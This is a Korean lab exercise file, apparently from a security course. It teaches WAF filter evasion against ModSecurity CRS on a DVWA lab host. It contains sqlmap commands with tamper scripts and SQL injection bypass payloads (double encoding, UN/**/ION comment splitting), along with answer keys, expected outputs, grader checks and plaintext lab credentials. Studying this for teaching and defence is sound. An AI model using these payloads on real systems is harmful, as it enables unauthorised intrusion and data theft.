@@ -1,0 +1,455 @@
+lab_id: standalone-attack-week10
+title: "필터 우회(인코딩·분할·난독화) vs 정규화 방어"
+version: standalone-attack
+course: attack
+week: 10
+description: |
+  공격기법 W10 — WAF 필터를 빠져나가는 우회(evasion) 기법과 그에 맞서는 ModSec CRS 의 정규화
+  (normalization) 방어. 핵심 원리는 "WAF 가 보는 표현"과 "백엔드가 실행하는 의미"의 분리다.
+  공격자(외부 공격자 VM 192.168.0.202, 192.168.0.202)는 평문 SQLi(`UNION SELECT`)를 baseline 으로 던져 dvwa
+  (차단 모드)가 403 으로 막는 것을 확인한 뒤, 같은 공격을 인코딩(이중·유니코드)·분할(주석·공백)·
+  난독화(대소문자)로 변형해 다시 던진다. ModSec CRS 는 검사 전에 transformation(urlDecodeUni/
+  compressWhitespace/lowercase)으로 인코딩·탭·대소문자 변형을 원형으로 되돌려 942 룰군에 다시 잡아
+  403 으로 차단한다. 그러나 이 CRS 3.3.2 의 libinjection 은 주석분할(UN/**/ION)은 못 복원해 실제로
+  302 우회된다 — "정규화는 강력하나 만능이 아님". 마지막에 우회 결과 차이(인코딩·탭·대소문자=차단,
+  주석분할=우회)와 고급 방향(WAF–백엔드 파서 차이·HPP)을 정리한다.
+  실습은 페이로드 전송 + 로그 읽기뿐이라 심는 흔적이 없다(공유 인프라 보존). 인가된 실습 환경
+  (el34)에서만. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서 공인 진입 192.168.0.161로 —
+  `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 방어 로그 확인은 WAF 장비 `ssh ccc@10.20.32.80`(비번 1)에서 시선을 바꿔 확인한다. 합격 임계값 0.7.
+difficulty: medium
+duration_minutes: 160
+prerequisites:
+  - "W04–W05(SQLi/XSS·WAF) 통과 — CRS 942 룰군·anomaly score·949110 차단 메커니즘 이해"
+  - "공격 VM ssh att@192.168.0.202 + 방어 WAF 장비 ssh ccc@10.20.32.80 (비번 1)"
+  - "lecture §1(우회 원리: 표현 ≠ 의미) §2(인코딩) §3(분할·난독화) §4(정규화 방어) 숙지"
+objectives:
+  - "WAF 우회의 근본 원리(WAF 가 보는 표현 ≠ 백엔드가 실행하는 의미) 이해"
+  - "평문 SQLi 를 baseline(403)으로 잡고, 인코딩·분할·난독화로 변형해 우회 시도"
+  - "CRS transformation(정규화)이 인코딩·탭·대소문자는 원형으로 되돌려 942 에 차단(403)하나 주석분할은 못 잡아 우회(302)됨을 확인"
+  - "우회 결과 차이(인코딩·탭·대소문자=차단, 주석분할=우회)와 고급 방향(파서 차이·특이 인코딩·HPP) 구분"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 목표
+      우회 실습을 시작하기 전, 대상 vhost `dvwa.el34.lab` 이 도달 가능한지 점검한다.
+
+      ## 📖 개념 한 줄
+      WAF 우회 실습의 무대는 **차단 모드 vhost** 여야 우회 성공/실패가 또렷이 보인다. el34 에서
+      dvwa 는 ModSec 차단 모드(403), juice 는 탐지만(200)이므로 대상은 dvwa 다(lecture §1.3).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
+      whatweb -a1 http://dvwa.el34.lab/
+      ```
+      > 💡 브라우저 주소창에 `http://dvwa.el34.lab/` 를 열면 화면(또는 로그인 리다이렉트)이 뜬다 — 여기선
+      > 도달성만 보므로 코드만 필요해 `-o /dev/null -w`(본문 버리고 코드만).
+      - 자연 URL `http://dvwa.el34.lab/`(호스트명이 dvwa vhost 지정), `-w 'dvwa=%{http_code}'`(응답 코드만), `-o /dev/null`(본문 버림).
+
+      ## ✅ 합격 기준
+      `dvwa` 출력 시 통과. **근거:** dvwa=<코드> 형태로 응답이 출력되면 대상 도달(우회를 시험할 수
+      있는 상태) — 차단형 vhost 라야 평문 403 대비 우회의 성공/실패를 측정할 수 있다.
+    hint: '도달성'
+    category: survey
+    points: 10
+    answer: |
+      # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
+      ssh att@192.168.0.202 'whatweb -a1 http://dvwa.el34.lab/'
+    answer_detail: "필터 우회 대상 = dvwa(차단 모드, ModSec CRS). 응답 코드가 출력되면 대상 도달로 판정 — 차단형 vhost 라야 평문 403 대비 우회의 성공/실패를 또렷이 측정할 수 있다."
+    expected_output: |
+      dvwa=302
+    verify:
+      type: output_contains
+      expect: 'dvwa'
+      field: stdout
+      semantic:
+        intent: "대상 점검"
+        success_criteria: ["도달"]
+        acceptable_methods: ["**[OSS] whatweb 도달성 (권장)**"]
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 목표
+      변형 없는 **평문 SQLi** 를 던져 dvwa 가 403 으로 막는 것을 확인하고, 이를 우회 평가의
+      기준점(baseline)으로 삼는다.
+
+      ## 📖 개념 한 줄
+      우회 성공/실패는 baseline 대비로만 판정할 수 있다. 평문 `UNION SELECT` 가 403 이어야,
+      "변형이 이 403 을 200 으로 바꿀 수 있는가"라는 우회의 질문이 성립한다(lecture §1.1).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # baseline — 진짜 SQLi 도구 sqlmap의 평문 페이로드 → 차단형 dvwa는 WAF가 전부 403(우회 평가의 기준선)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
+      ```
+      sqlmap 의 평문 SQLi 페이로드가 전부 403 으로 막히고 'WAF/IPS 로 보호됨' + '403 (Forbidden) - N times' 로
+      보고되면, CRS 942→949110 차단이 확인된 것 = 이 WAF 차단이 우회 평가의 기준선(baseline)이다.
+      > 💡 **화면으로 확인:** GET 요청이라 브라우저 주소창에 `http://dvwa.el34.lab/?id=1' UNION SELECT 1--` 를
+      > 열면 **403 페이지**가 뜬다. 이후 우회 변형은 페이로드를 조금씩 바꿔 되쏘는 작업이라 **Burp Repeater** 가 편하다.
+      - `id=1%27%20UNION%20SELECT%201--`(`%27`='`', `%20`=공백) = 평문 `1' UNION SELECT 1--`. 변형 없는 전형적 UNION SQLi → CRS 942 가 곧장 잡음.
+
+      ## ✅ 합격 기준
+      `403` 출력 시 통과. **근거:** sqlmap 의 평문 SQLi 가 dvwa 에서 WAF 에 막혀 '403 (Forbidden)'로
+      보고되면 통과 — 이 WAF 차단이 이후 tamper 우회 시도의 기준선(baseline)이다.
+    hint: 'sqlmap 평문 SQLi → WAF 403'
+    category: manipulation
+    points: 12
+    answer: |
+      # baseline — sqlmap 평문 SQLi → 차단형 dvwa는 WAF가 전부 403(기준선)
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "baseline = 진짜 SQLi 도구 sqlmap의 평문 페이로드 → WAF 403. 변형 없는 UNION SELECT 계열 probe가 CRS 942 룰군에 곧장 잡혀 anomaly score 누적 → 949110 차단(403). sqlmap 스스로 'WAF/IPS 로 보호된다'고 감지하고 '--tamper'를 권하며 '403 (Forbidden) - N times'로 보고한다. 이후 tamper 우회 기법이 이 WAF 차단을 넘는지가 본 주차의 관건."
+    expected_output: |
+      [09:11:24] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:11:26] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+      403 (Forbidden) - 75 times
+    verify:
+      type: output_contains
+      expect: '403'
+      field: stdout
+      semantic:
+        intent: "기준 공격 baseline(sqlmap WAF 차단)"
+        success_criteria: ["평문 SQLi WAF 403"]
+        acceptable_methods: ["**[OSS] sqlmap 평문 SQLi (권장)**"]
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 목표
+      가장 기본적인 우회 계열인 **인코딩**(이중 인코딩·부분 URL 인코딩)으로 평문 SQLi 를 변형해
+      던지고, 그 결과(대부분 여전히 403)를 확인한다.
+
+      ## 📖 개념 한 줄
+      인코딩 우회는 "WAF 가 디코드 **전**에 검사한다"는 가정에 기댄다. 그러나 CRS 는 정규화
+      (`t:urlDecodeUni`)로 **먼저 디코드한 뒤** 검사하므로 이 가정이 깨진다(lecture §2, §4).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 인코딩 우회 자동화 — sqlmap --tamper=charunicodeencode(모든 문자를 유니코드 인코딩; charencode도 동일 계열)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=charunicodeencode --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
+      ```
+      sqlmap 이 인코딩 tamper(charunicodeencode)를 로드해 모든 문자를 유니코드로 인코딩해 던져도 dvwa 는
+      여전히 403 — CRS 가 `t:urlDecodeUni` 로 **먼저 디코드한 뒤** 검사해 원형 UNION SELECT 로 되돌리기
+      때문이다("디코드 전 검사" 가정이 깨짐). 이중 인코딩(%2527)·부분 인코딩(%55NION)도 같은 이유로 무력하다.
+      > 💡 **Burp Repeater 로도 동일:** `?id=` 값만 `%2527`·`%55NION` 등으로 바꿔 Send 하면 응답 코드가 바로
+      > 보인다 — 인코딩을 한 글자씩 바꿔 되쏘는 우회 탐색엔 Burp Repeater 가 nc 단발 반복보다 빠르다.
+      - `%2527`=이중 인코딩(`%`를 `%25`로 한 번 더 → `%2527`→`%27`→`'`), `%55`=`U`/`%53`=`S`(부분 URL 인코딩 → UNION SELECT).
+
+      ## ✅ 합격 기준
+      `403` 출력 시 통과. **근거:** sqlmap 의 인코딩 tamper(charunicodeencode) 시도가 여전히 403(우회 실패)이면
+      통과 — CRS 가 t:urlDecodeUni 로 디코드한 뒤 잡는다(디코드-전-검사 가정이 깨짐).
+    hint: 'sqlmap --tamper=charunicodeencode'
+    category: manipulation
+    points: 12
+    answer: |
+      # 인코딩 우회 자동화 — sqlmap --tamper=charunicodeencode → CRS urlDecodeUni 정규화로 여전히 403
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=charunicodeencode --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "인코딩 우회 = 같은 문자를 다른 표기로 적기(유니코드·이중인코딩 %2527→'·부분 인코딩 %55=U). sqlmap의 인코딩 tamper(charunicodeencode)로 모든 문자를 유니코드 인코딩해 자동 발사한다. 노림수는 'WAF 가 디코드 전에 검사한다'는 가정이지만, CRS 는 t:urlDecodeUni transformation 으로 먼저 디코드한 뒤 검사하므로 원형 UNION SELECT 로 되돌아가 942 에 잡힘 → 우회 실패(여전히 403). sqlmap이 tamper를 로드해도 스캐너 probe 총합이 anomaly에 걸린다."
+    expected_output: |
+      [09:43:53] [INFO] loading tamper module 'charunicodeencode'
+      [09:43:53] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:43:55] [ERROR] all tested parameters do not appear to be injectable...
+      403 (Forbidden) - 76 times
+    verify:
+      type: output_contains
+      expect: '403'
+      field: stdout
+      semantic:
+        intent: "인코딩 tamper 우회 시도 + 정규화"
+        success_criteria: ["sqlmap 인코딩 tamper", "정규화로 차단"]
+        acceptable_methods: ["**[OSS] sqlmap --tamper 인코딩 (권장)**"]
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 목표
+      인코딩과 결이 다른 우회 — 키워드의 형태를 흐트러뜨리는 **분할·난독화**(주석 삽입·탭 공백)를
+      sqlmap 의 tamper 스크립트로 자동 시도하고, 자동 스캐너가 이 CRS 를 넘는지 확인한다.
+
+      ## 📖 개념 한 줄
+      분할·난독화는 문자를 다르게 적는 게 아니라 키워드 **형태**를 쪼갠다. CRS 의
+      `t:compressWhitespace`·`t:lowercase` 는 탭·대소문자 변형을 복원해 차단(403)하고, 주석 분할
+      (`UN/**/ION`)은 libinjection 빈틈이라 **단발 수작업 payload 는 우회(302)** 가능하나, sqlmap 처럼
+      수십 발을 쏘는 **자동 스캐너는 tamper 를 써도** 그 총합이 942 에 걸려 여전히 차단된다(lecture §3, §4).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 분할/난독화 우회 자동화 — sqlmap --tamper=space2comment(공백→/**/ 주석분할; UN/**/ION 형태)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
+      ```
+      sqlmap 이 space2comment tamper 로 공백을 `/**/`(주석)으로 바꿔 주석분할을 자동 시도하지만, 스캐너는
+      여전히 403 — sqlmap 은 수십 개 probe(작은따옴표·괄호·키워드)를 함께 쏘고 CRS anomaly scoring 이 그
+      총합을 잡기 때문이다. 개념: 손으로 정밀하게 만든 **단 하나**의 주석분할 payload(`UN/**/ION`, raw 요청)는
+      이 CRS 3.3.2 의 libinjection 이 토큰을 못 복원해 통과(302)할 수 있으나, 자동 스캐너는 재인코딩·다른
+      probe 로 결국 942 에 걸린다 — 실전 우회는 자동화가 아니라 수작업 정밀도가 관건이다.
+      > 💡 **개념(수작업 vs 자동):** 손으로 만든 단발 `UN/**/ION` payload 를 **Burp Repeater** 로 정밀하게
+      > 보내면 응답이 403 이 아니라 **302**(libinjection 빈틈으로 백엔드 통과)가 될 수 있다 — 그러나 sqlmap 같은
+      > 자동 스캐너는 그 한 발이 아니라 수십 발을 쏘아 결국 942 에 걸린다(자동화 ≠ 은밀).
+      - 주석 삽입(`/**/`로 키워드 사이 쪼갬 — libinjection 미복원, 단발 수작업은 우회 가능), 탭(`%09` — compressWhitespace 복원→차단), 케이스(`UnIoN` — lowercase 복원→차단).
+
+      ## ✅ 합격 기준
+      `tamper` 출력 시 통과. **근거:** sqlmap 이 space2comment tamper(주석분할)를 로드해 우회를 자동 시도하고
+      그 결과(여기선 여전히 403 차단)를 보고하면 통과 — 자동 스캐너는 tamper 로도 CRS anomaly 를 넘기 어렵고,
+      단발 주석분할의 정밀 우회(302)는 수작업 몫이다(libinjection 빈틈).
+    hint: 'sqlmap --tamper=space2comment'
+    category: manipulation
+    points: 12
+    answer: |
+      # 분할/난독화 우회 자동화 — sqlmap --tamper=space2comment(주석분할) → 스캐너는 여전히 403
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "분할/난독화 = 문자가 아니라 키워드 형태를 흐트러뜨리기(주석분할 UN/**/ION, 탭 %09, 대소문자 UnIoN). sqlmap의 space2comment tamper로 공백을 /**/(주석)으로 바꿔 주석분할을 자동 시도한다. 탭·대소문자는 CRS의 t:compressWhitespace·t:lowercase가 복원해 차단, 주석분할은 이 CRS 3.3.2의 libinjection이 토큰을 복원 못 해 '단발 수작업 payload'는 302 통과 가능하나, sqlmap 같은 자동 스캐너는 수십 개 probe(작은따옴표·괄호)를 함께 쏘아 CRS anomaly에 걸려 여전히 403이다 — 자동화 ≠ 은밀. 채점은 출력에 'tamper'(모듈 로드)가 보이는지로 판정한다(정밀 302 우회는 수작업 몫)."
+    expected_output: |
+      [09:13:09] [INFO] loading tamper module 'space2comment'
+      [09:13:09] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:13:11] [ERROR] all tested parameters do not appear to be injectable...
+      403 (Forbidden) - 76 times
+    verify:
+      type: output_contains
+      expect: 'tamper'
+      field: stdout
+      semantic:
+        intent: "분할/난독화 tamper 자동 우회 + CRS 차단"
+        success_criteria: ["sqlmap space2comment tamper", "스캐너도 CRS에 403"]
+        acceptable_methods: ["**[OSS] sqlmap --tamper 주석분할 (권장)**"]
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 목표
+      미션 2–4 에서 인코딩·탭·대소문자 변형은 403 으로 막혔지만 주석분할은 302 로 우회된 이유를
+      한곳에 모아, CRS 의 **정규화(transformation)** 메커니즘과 그 **빈틈**으로 설명한다.
+
+      ## 📖 개념 한 줄
+      정규화는 검사 **전에** 다양한 표현을 하나의 원형으로 통일하는 과정이다. 인코딩·탭·대소문자는
+      이 통일로 942 에 수렴해 차단되지만, 주석분할은 libinjection 이 토큰을 복원하지 못해 빠져나간다 —
+      정규화는 강력하나 만능이 아니다(lecture §4).
+
+      ## 💻 실행 방법 — 편집기로 정규화 정리 작성
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 `nano ~/w10_normalize.md` 를 열고, 각
+      transformation 이 차단하는 변형과 정규화가 놓치는 빈틈을 아래처럼 정리·저장한다(Ctrl+O 저장, Ctrl+X 종료).
+
+      ```markdown
+      # W10 CRS 정규화(transformation) — 차단 vs 빈틈
+      ## t:urlDecodeUni       → %55→U, %2527→작은따옴표 (인코딩 변형 차단 403)
+      ## t:compressWhitespace → %09/다중공백 → 단일 공백 (탭 분할 차단 403)
+      ## t:lowercase          → UnIoN → union (대소문자 변형 차단 403)
+      ## 빈틈 : UN/**/ION 주석분할은 libinjection 이 토큰을 못 복원 → 302 우회(정규화의 한계)
+      ## 결론 : 정규화는 인코딩/탭/대소문자는 잡지만 주석분할은 놓침 → WAF 단독 방어 불가, 코드 수정 필요
+      ```
+      작성 후 `cat ~/w10_normalize.md` 로 확인한다 — 정리는 echo 로 찍는 게 아니라 메커니즘을 스스로 설명해 쓰는 문서다.
+
+      ## ✅ 합격 기준
+      `정규화` 출력 시 통과. **근거:** 각 transformation 이 차단하는 변형(인코딩/탭/대소문자)과 정규화가
+      놓치는 빈틈(주석분할 302 우회)을 함께 정리하면 통과 — '정규화 만능'이 아님이 핵심.
+    hint: '정규화 transformation'
+    category: analysis
+    points: 12
+    answer: |
+      # (편집기로 작성한 정규화 정리 — 채점용)
+      ssh att@192.168.0.202 'cat > ~/w10_normalize.md <<'"'"'EOF'"'"'
+      # W10 CRS 정규화(transformation) — 차단 vs 빈틈
+      ## t:urlDecodeUni       → %55→U, %2527→작은따옴표 (인코딩 변형 차단 403)
+      ## t:compressWhitespace → %09/다중공백 → 단일 공백 (탭 분할 차단 403)
+      ## t:lowercase          → UnIoN → union (대소문자 변형 차단 403)
+      ## 빈틈 : UN/**/ION 주석분할은 libinjection 이 토큰을 못 복원 → 302 우회(정규화의 한계)
+      ## 결론 : 정규화는 인코딩/탭/대소문자는 잡지만 주석분할은 놓침 → WAF 단독 방어 불가, 코드 수정 필요
+      EOF
+      cat ~/w10_normalize.md'
+    answer_detail: "편집기로 ~/w10_normalize.md 를 작성해 정규화 메커니즘을 정리한다. 정규화(transformation)는 인코딩(t:urlDecodeUni)·탭/공백(t:compressWhitespace)·대소문자(t:lowercase)를 원형으로 통일해 942 로 수렴시켜 차단(403)한다. 그러나 이 CRS 3.3.2 의 libinjection 은 주석 분할(UN/**/ION)을 토큰으로 복원하지 못해 302 로 우회된다 — 정규화는 강력하나 만능이 아니며, 그래서 WAF 는 단독 방어가 될 수 없고 근본 해결은 코드 수정(파라미터 바인딩)이다. 채점은 저장 파일 출력에 '정규화'가 보이면 통과."
+    expected_output: |
+      # W10 CRS 정규화(transformation) — 차단 vs 빈틈
+      ## t:urlDecodeUni       → %55→U, %2527→작은따옴표 (인코딩 변형 차단 403)
+      ## t:compressWhitespace → %09/다중공백 → 단일 공백 (탭 분할 차단 403)
+      ## t:lowercase          → UnIoN → union (대소문자 변형 차단 403)
+      ## 빈틈 : UN/**/ION 주석분할은 libinjection 이 토큰을 못 복원 → 302 우회(정규화의 한계)
+      ## 결론 : 정규화는 인코딩/탭/대소문자는 잡지만 주석분할은 놓침 → WAF 단독 방어 불가, 코드 수정 필요
+    verify:
+      type: output_contains
+      expect: '정규화'
+      field: stdout
+      semantic:
+        intent: "정규화 효과 이해"
+        success_criteria: ["transformation 종류", "차단/우회 구분(주석분할 빈틈)"]
+        acceptable_methods: ["**[설명] 정규화 (권장)**"]
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 목표 — 탐지 분석: 정규화 후 ModSec 942
+      방어자 시점으로 돌아서서, 미션 2–4 의 모든 우회 시도가 정규화 후 942 룰군에 잡혔음을 확인한다.
+
+      ## 📖 개념 한 줄
+      표현은 달라도 정규화하면 같은 공격이다 — 그래서 인코딩·주석·공백 우회가 전부 942(SQLi)
+      한 룰군에 모인다. CRS 가 다양한 우회를 하나의 탐지로 흡수하는 강점이다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **방어자 시선:** WAF 장비에 직접 접속한다 — `ssh ccc@10.20.32.80`(비번 `1`).
+
+      ```bash
+      # 1) modsec_audit 최근 150줄에서 942(SQLi) 룰ID 집계 — 우회 시도들이 정규화 후 942에 잡힘
+      sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c
+      ```
+      집계에 942 대역이 보이면 인코딩·주석·공백 우회 시도들이 정규화 후 942(SQLi) 한 룰군에 모여 탐지된 것 —
+      표현은 달라도 정규화하면 같은 공격이라, CRS 가 다양한 우회를 하나의 탐지로 흡수하는 강점이다.
+
+      ## ✅ 합격 기준
+      `942` 출력 시 통과. **근거:** 우회 시도들이 정규화 후 942 에 탐지됨이 보이면 통과 — 표현이
+      달라도 정규화하면 같은 공격이라 한 룰군으로 모인다.
+    hint: 'modsec 942'
+    category: analysis
+    points: 12
+    answer: |
+      # 1) modsec_audit 최근 150줄에서 942(SQLi) 룰ID 집계 — 우회 시도들이 정규화 후 942에 잡힘
+      ssh ccc@10.20.32.80 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+    answer_detail: "모든 우회 시도가 정규화 후 942에 탐지된다. 표현은 달라도 정규화하면 같은 공격 — CRS가 다양한 우회를 한 룰군(942)으로 흡수하는 것이 강점이다. 출력에 942 가 보이면 통과."
+    expected_output: |
+      16 941100
+           12 941110
+            4 941120
+           16 941160
+          168 942100
+            2 942140
+           28 942160
+           28 942190
+          296 949110
+    verify:
+      type: output_contains
+      expect: '942'
+      field: stdout
+      semantic:
+        intent: "우회 시도의 탐지 확인"
+        success_criteria: ["942 탐지"]
+        acceptable_methods: ["**[OSS] modsec 942 (권장)**"]
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 목표 — 우회 한계 + 고급 방향
+      정규화가 잡는 우회(인코딩·탭·대소문자=403)와 놓치는 우회(주석분할=302, 미션 4~5)를 가르고,
+      그 위에서 고급 우회(파서 차이·특이 인코딩·HPP)가 노리는 빈틈을 정리한다.
+
+      ## 📖 개념 한 줄
+      인코딩·탭·대소문자 우회는 CRS 정규화에 막히지만(403), 정규화가 놓치는 표현(주석분할 302)·
+      WAF↔백엔드 파서 차이·HPP 는 여전히 빈틈이다 — 다만 환경 특이적이라 어렵다. WAF 는 진입장벽을 높이는 보조 방어다.
+
+      ## 💻 실행 방법 — 편집기로 우회 한계·고급 방향 정리
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 `nano ~/w10_advanced.md` 를 열고, 정규화가
+      막는 우회와 놓치는 빈틈·고급 방향을 아래처럼 정리·저장한다(Ctrl+O 저장, Ctrl+X 종료).
+
+      ```markdown
+      # W10 우회 한계 + 고급 방향
+      ## 정규화가 잡음 : 인코딩/탭/대소문자 = 403 (단순 우회 무력)
+      ## 정규화 빈틈  : 주석분할(UN/**/ION) = 302 우회
+      ## 고급 방향   : 정규화가 놓치는 표현(특이 charset/overlong UTF-8), 파서 차이(WAF vs 백엔드), HPP(파라미터 오염), 페이로드 분산/시간차
+      ## 결론 : WAF 우회는 가능하나 어렵고 환경 특이적. WAF 는 시간을 벌어주는 보조 방어
+      ```
+      작성 후 `cat ~/w10_advanced.md` 로 확인한다 — 정리는 echo 로 찍는 게 아니라 빈틈을 스스로 짚어 쓰는 문서다.
+
+      ## ✅ 합격 기준
+      `HPP` 출력 시 통과. **근거:** 정규화의 차단/빈틈(주석분할 302)과 고급 방향(파서 차이·특이
+      인코딩·HPP)이 정리되면 통과 — WAF 우회는 가능하나 어렵고 환경 특이적이다.
+    hint: '정규화 놓치는 표현, HPP'
+    category: analysis
+    points: 10
+    answer: |
+      # (편집기로 작성한 우회 한계·고급 정리 — 채점용)
+      ssh att@192.168.0.202 'cat > ~/w10_advanced.md <<'"'"'EOF'"'"'
+      # W10 우회 한계 + 고급 방향
+      ## 정규화가 잡음 : 인코딩/탭/대소문자 = 403 (단순 우회 무력)
+      ## 정규화 빈틈  : 주석분할(UN/**/ION) = 302 우회
+      ## 고급 방향   : 정규화가 놓치는 표현(특이 charset/overlong UTF-8), 파서 차이(WAF vs 백엔드), HPP(파라미터 오염), 페이로드 분산/시간차
+      ## 결론 : WAF 우회는 가능하나 어렵고 환경 특이적. WAF 는 시간을 벌어주는 보조 방어
+      EOF
+      cat ~/w10_advanced.md'
+    answer_detail: "편집기로 ~/w10_advanced.md 를 작성해 우회의 현실을 정리한다 = 단순 기법(인코딩/탭/대소문자)은 정규화에 무력(403), 주석분할은 빈틈(302). 고급은 정규화가 놓치는 표현(특이 charset/overlong UTF-8), WAF↔백엔드 파서 차이, HPP(파라미터 오염), 페이로드 분산/시간차를 악용하나 환경 특이적이라 어렵다. WAF는 완벽하지 않지만 진입장벽을 크게 높이는 보조 방어다. 채점은 저장 파일 출력에 'HPP'가 보이면 통과."
+    expected_output: |
+      # W10 우회 한계 + 고급 방향
+      ## 정규화가 잡음 : 인코딩/탭/대소문자 = 403 (단순 우회 무력)
+      ## 정규화 빈틈  : 주석분할(UN/**/ION) = 302 우회
+      ## 고급 방향   : 정규화가 놓치는 표현(특이 charset/overlong UTF-8), 파서 차이(WAF vs 백엔드), HPP(파라미터 오염), 페이로드 분산/시간차
+      ## 결론 : WAF 우회는 가능하나 어렵고 환경 특이적. WAF 는 시간을 벌어주는 보조 방어
+    verify:
+      type: output_contains
+      expect: 'HPP'
+      field: stdout
+      semantic:
+        intent: "우회 한계 + 고급 방향"
+        success_criteria: ["단순 무력", "고급(파서차이/HPP)"]
+        acceptable_methods: ["**[설명] 우회 한계 (권장)**"]
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 목표 — 필터 우회 종합 보고서
+      미션 1~7(baseline·인코딩·분할/난독화·정규화·탐지·한계)을 한 보고서로 종합한다.
+
+      ## 📖 개념 한 줄
+      필터 우회 vs 정규화 = 표현 다양화 vs 표현 통일의 대결이다. 단순 우회는 CRS 정규화가 이기고,
+      고급 우회는 파서 차이를 악용한다 — 이 대결 구도를 보고서로 정리한다.
+
+      ## 💻 실행 방법 — 편집기로 필터 우회 보고서 작성
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 `nano ~/w10_report.md` 를 열고, 미션 1~7 을
+      아래 골격에 채워 저장한다(Ctrl+O 저장, Ctrl+X 종료).
+
+      ```markdown
+      # 공격 W10 — 필터 우회 vs 정규화 보고서
+      ## 1. 기준 : 평문 SQLi 403. 우회 시도 : 이중인코딩/부분인코딩/주석분할/탭/대소문자
+      ## 2. 정규화 : CRS transformation(urlDecodeUni/compressWhitespace/lowercase)으로 표현 통일
+      ## 3. 결과 : 인코딩·탭·대소문자=차단(403, 942 수렴), 주석분할=우회(302, libinjection 빈틈)
+      ## 4. 한계 : 단순 우회 무력, 고급은 파서 차이·HPP(환경 특이적)
+      ## 결론 : 같은 공격을 다르게 표현해도 정규화가 통일 → 단순 우회는 CRS가 이긴다. 근본은 코드 수정
+      ```
+      작성 후 `cat ~/w10_report.md` 로 확인한다 — 보고서는 heredoc 출력이 아니라 편집기로 직접 쓴 산출물이다.
+
+      ## ✅ 합격 기준
+      `우회` 출력 시 통과. **근거:** 보고서에 우회 시도 + 정규화 방어 + 탐지/한계가 모두 포함되면
+      통과 — 표현 다양화 vs 표현 통일의 대결 구도가 핵심이다.
+    hint: '우회+정규화+한계'
+    category: report
+    points: 10
+    answer: |
+      # (편집기로 작성한 필터 우회 보고서 — 채점용)
+      ssh att@192.168.0.202 'cat > ~/w10_report.md <<'"'"'EOF'"'"'
+      # 공격 W10 — 필터 우회 vs 정규화 보고서
+      ## 1. 기준 : 평문 SQLi 403. 우회 시도 : 이중인코딩/부분인코딩/주석분할/탭/대소문자
+      ## 2. 정규화 : CRS transformation(urlDecodeUni/compressWhitespace/lowercase)으로 표현 통일
+      ## 3. 결과 : 인코딩·탭·대소문자=차단(403, 942 수렴), 주석분할=우회(302, libinjection 빈틈)
+      ## 4. 한계 : 단순 우회 무력, 고급은 파서 차이·HPP(환경 특이적)
+      ## 결론 : 같은 공격을 다르게 표현해도 정규화가 통일 → 단순 우회는 CRS가 이긴다. 근본은 코드 수정
+      EOF
+      cat ~/w10_report.md'
